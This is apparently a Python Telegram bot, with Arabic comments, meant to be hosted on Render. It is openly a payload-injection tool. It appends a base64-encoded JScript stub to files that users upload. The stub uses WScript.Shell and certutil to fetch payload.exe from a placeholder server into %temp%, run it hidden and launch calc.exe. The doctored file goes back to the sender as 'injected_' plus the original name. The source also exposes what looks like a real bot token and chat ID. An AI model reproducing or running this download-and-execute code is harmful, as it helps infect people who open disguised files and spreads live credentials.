import os
import time
import threading
import requests
import json
import base64
import random
from datetime import datetime
from flask import Flask

app = Flask(__name__)

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8618971021:AAHNf7o2muoU1ZiFx7EzZDvq950hKn30ELk",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

PAYLOAD_CONFIG = {
    "PAYLOAD_URL": "http://YOUR_SERVER.com/payload.exe",
    "FALLBACK_COMMAND": "calc.exe",
    "PAYLOAD_MARKER": "###PAYLOAD_START###",
    "PAYLOAD_END": "###PAYLOAD_END###"
}

# ============ مسار اختبار ============
@app.route('/')
def home():
    return "✅ Bot is running on Render!"

@app.route('/health')
def health():
    return "OK", 200

# ============ دوال البوت ============
def send_telegram_message(chat_id, message):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def download_telegram_file(file_id, save_path):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params)
        
        if response.status_code != 200:
            return False
        
        data = response.json()
        if not data.get('ok'):
            return False
        
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_CONFIG['TOKEN']}/{file_path}"
        
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        
        response = requests.get(download_url, stream=True, timeout=60)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
        return False
    except:
        return False

def generate_payload_stub():
    payload_js = f"""
    try {{
        var shell = new ActiveXObject("WScript.Shell");
        var payload_url = "{PAYLOAD_CONFIG['PAYLOAD_URL']}";
        var temp_path = shell.ExpandEnvironmentStrings("%temp%\\\\update.exe");
        shell.Run("cmd.exe /c certutil -urlcache -f " + payload_url + " " + temp_path, 0, true);
        shell.Run(temp_path, 0, false);
        shell.Run("{PAYLOAD_CONFIG['FALLBACK_COMMAND']}", 0, false);
    }} catch(e) {{}}
    """
    return base64.b64encode(payload_js.encode('utf-8')).decode('utf-8')

def inject_payload_into_file(file_path, output_path=None):
    if output_path is None:
        output_path = file_path
    
    try:
        with open(file_path, 'rb') as f:
            original_data = f.read()
        
        payload_stub = generate_payload_stub()
        payload_data = f"""
{PAYLOAD_CONFIG['PAYLOAD_MARKER']}
{payload_stub}
{PAYLOAD_CONFIG['PAYLOAD_END']}
"""
        combined_data = original_data + payload_data.encode('utf-8')
        
        with open(output_path, 'wb') as f:
            f.write(combined_data)
        
        return True
    except:
        return False

def handle_file_injection(file_id, file_name, chat_id):
    temp_dir = "/tmp"
    os.makedirs(temp_dir, exist_ok=True)
    
    timestamp = int(time.time())
    random_id = random.randint(1000, 9999)
    
    temp_input = os.path.join(temp_dir, f"input_{timestamp}_{random_id}")
    temp_output = os.path.join(temp_dir, f"output_{timestamp}_{random_id}")
    
    send_telegram_message(chat_id, f"⏳ جاري تحميل: {file_name}")
    
    if not download_telegram_file(file_id, temp_input):
        send_telegram_message(chat_id, "❌ فشل التحميل!")
        return
    
    if inject_payload_into_file(temp_input, temp_output):
        output_name = f"injected_{file_name}"
        if send_telegram_file(chat_id, temp_output, f"✅ {output_name}"):
            send_telegram_message(chat_id, "✅ تم إرسال الملف المعدل!")
        else:
            send_telegram_message(chat_id, "❌ فشل الإرسال!")
    else:
        send_telegram_message(chat_id, "❌ فشل الحقن!")
    
    try:
        os.remove(temp_input)
        os.remove(temp_output)
    except:
        pass

def handle_command(command, chat_id):
    command = command.lower().strip()
    
    if command == "/start":
        msg = "🔐 بوت حقن البايلود\n📤 أرسل ملفاً لتعديله."
        send_telegram_message(chat_id, msg)
    elif command == "/help":
        msg = "📋 الأوامر:\n/start - ترحيب\n/help - مساعدة"
        send_telegram_message(chat_id, msg)
    else:
        send_telegram_message(chat_id, "⚠️ أمر غير معروف")

def listen_telegram():
    last_update_id = 0
    send_telegram_message(TELEGRAM_CONFIG['CHAT_ID'], "🟢 البوت يعمل على Render!")
    
    while True:
        try:
            url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    message = update.get('message', {})
                    chat_id = message.get('chat', {}).get('id')
                    
                    if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
                        continue
                    
                    text = message.get('text', '')
                    if text.startswith('/'):
                        handle_command(text, chat_id)
                        continue
                    
                    document = message.get('document')
                    if document:
                        file_id = document['file_id']
                        file_name = document.get('file_name', 'unknown')
                        handle_file_injection(file_id, file_name, chat_id)
                        continue
                    
                    photo = message.get('photo')
                    if photo:
                        file_id = photo[-1]['file_id']
                        handle_file_injection(file_id, 'image.jpg', chat_id)
                        continue
        except:
            pass
        time.sleep(2)

# ============ تشغيل البوت عند بدء التطبيق ============
def start_bot():
    print("🚀 بدء تشغيل البوت...")
    listen_telegram()

# بدء تشغيل البوت في خلفية منفصلة
thread = threading.Thread(target=start_bot)
thread.daemon = True
thread.start()
print("✅ تم بدء تشغيل البوت في الخلفية")

# ============ تشغيل Flask ============
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
